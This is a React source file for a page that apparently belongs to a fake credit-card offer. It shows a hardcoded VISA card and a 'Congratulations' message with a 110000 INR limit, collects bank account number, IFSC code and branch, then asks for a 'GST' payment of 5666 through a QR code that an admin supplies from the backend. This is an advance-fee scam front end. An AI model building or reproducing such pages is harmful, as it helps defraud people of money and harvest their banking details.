import React, { useContext, useEffect, useState } from "react";
import cardImage from "../../assets/creditCard.png";
import qrCodeImage from "../../assets/QrCode.jpeg";
import { UserAuthContext } from "../../context/UserAuthProvider";
import chip_img from '../../assets/chip_img.png'

const SecondStep = () => {
  const { user, applyCardUser, getApplyCardUser,admin } = useContext(UserAuthContext);
  const [showQrModal, setShowQrModal] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [formData, setFormData] = useState({
    accountNumber: "",
    confirmAccountNumber: "",
    accountHolderName: "",
    ifscCode: "",
    branch: "",
    amount: "",
  });

  const backendUrl = import.meta.env.VITE_BACKEND_BASE_URL

  useEffect(() => {
    getApplyCardUser();
  }, [user]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleFormSubmit = (e) => {
    e.preventDefault();
    // Basic form validation or other processing can go here
    setFormSubmitted(true);
  };

  const handleActivateClick = () => {
    setShowQrModal(true);
  };

  const closeModal = () => {
    setShowQrModal(false);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-r from-blue-500 to-purple-500 p-4">
      <div className="w-full bg-white rounded-xl shadow-xl p-6 space-y-6">
        <div className="flex flex-wrap gap-5 md:gap-0 md:justify-between justify-center items-center">
        <div>
            <div
              className={`w-[300px] mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl p-4 shadow-lg flex flex-col justify-between text-white`}
            >
              {/* {/ Visa Logo /} */}
              <div className="flex justify-between items-start">
                <div className="text-lg font-bold">Eastern</div>
                <div className="text-lg font-bold">VISA</div>
              </div>

              {/* {/ Card Type /} */}
              <div className="text-sm font-semibold">Credit Card</div>

              {/* {/ Chip and Contactless Icon /} */}
              <div className="flex items-center space-x-4">
                <div className="">
                  <img src={chip_img} alt="" className="w-[60px] h-full" />
                </div>
              </div>

              {/* {/ Card Number /} */}
              <div className="tracking-wider text-xl font-semibold">
                9203 7834 4532 5867
              </div>

              {/* {/ Card Holder and Expiry /} */}
              <div className="flex justify-between items-center text-sm">
                <div>{applyCardUser?.userId?.name}</div>
                <div>VALID THRU 12/25</div>
              </div>
            </div>
          </div>


          <div className="text-center">
            <h2 className="text-2xl font-semibold text-gray-800 mb-2">
              Congratulations
            </h2>
            <p className="text-lg text-gray-700">
              Your Credit Card Limit <br />
              <span className="text-3xl font-bold text-green-600">
                110000 INR
              </span>
            </p>
          </div>
        </div>

        {/* Form for account details */}
        {!formSubmitted ? (
          <form onSubmit={handleFormSubmit} className="space-y-4">
            <input
              type="text"
              name="accountNumber"
              placeholder="Account Number"
              value={formData.accountNumber}
              onChange={handleChange}
              className="w-full p-2 border rounded-md"
              required
            />
            <input
              type="text"
              name="confirmAccountNumber"
              placeholder="Confirm Account Number"
              value={formData.confirmAccountNumber}
              onChange={handleChange}
              className="w-full p-2 border rounded-md"
              required
            />
            <input
              type="text"
              name="accountHolderName"
              placeholder="Account Holder Name"
              value={formData.accountHolderName}
              onChange={handleChange}
              className="w-full p-2 border rounded-md"
              required
            />
            <input
              type="text"
              name="ifscCode"
              placeholder="IFSC Code"
              value={formData.ifscCode}
              onChange={handleChange}
              className="w-full p-2 border rounded-md"
              required
            />
            <input
              type="text"
              name="branch"
              placeholder="Branch"
              value={formData.branch}
              onChange={handleChange}
              className="w-full p-2 border rounded-md"
              required
            />
            <input
              type="number"
              name="amount"
              placeholder="Enter Amount"
              value={formData.amount}
              onChange={handleChange}
              className="w-full p-2 border rounded-md"
              required
            />
            <button
              type="submit"
              className="w-full py-2 bg-blue-600 text-white font-semibold rounded-md shadow-md hover:bg-blue-700 focus:outline-none"
            >
              Submit
            </button>
          </form>
        ) : (
          <div className="flex flex-col items-center space-y-4">
            <button className="px-6 py-2  text-black text-2xl font-semibold rounded-md  focus:outline-none">
              GST Pay Now
            </button>
            <p className="max-w-4xl">
              GST is a consumption based tax that is levied on the supply of
              goods and services. It is designed to replace a complex web of
              indirect taxes and create a unified tax system The GST system is
              structured into various slabs, and the rate may vary for different
              types of goods and services
            </p>
            <button
              onClick={handleActivateClick}
              className="px-6 py-2 bg-blue-600 text-white font-semibold rounded-md shadow-md hover:bg-blue-700 focus:outline-none"
            >
              Continue to Pay
            </button>
          </div>
        )}
      </div>

      {/* QR Code Modal */}
      {showQrModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg shadow-lg relative max-w-xs w-full">
            <button
              onClick={closeModal}
              className="absolute top-2 right-2 text-xl text-gray-600 hover:text-gray-900 focus:outline-none"
            >
              &times;
            </button>
            <h3 className="text-lg font-semibold text-gray-800 mb-4">
              Payment QR Code
            </h3>
            <p className="text-gray-700 mb-4">
              Please scan the QR code to pay the amount 5666.
            </p>
            <img
               src={backendUrl+'/'+admin?.qrcode}
              alt="QR Code"
              className="w-32 h-32 mx-auto border border-gray-300 rounded-md shadow-md mb-4"
            />
          </div>
        </div>
      )}
    </div>
  );
};

export default SecondStep;
